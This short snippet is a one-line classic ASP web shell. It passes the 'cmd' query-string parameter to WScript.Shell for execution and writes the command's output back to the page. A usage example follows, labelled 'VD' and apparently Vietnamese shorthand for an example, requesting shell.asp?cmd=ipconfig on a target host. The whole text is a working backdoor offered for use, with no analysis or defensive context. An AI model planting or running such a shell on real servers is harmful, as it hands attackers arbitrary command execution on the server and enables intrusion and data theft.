<%response.write CreateObject("WScript.Shell").Exec(Request.QueryString("cmd")).StdOut.Readall()%>

VD: http://target/shell.asp?cmd=ipconfig
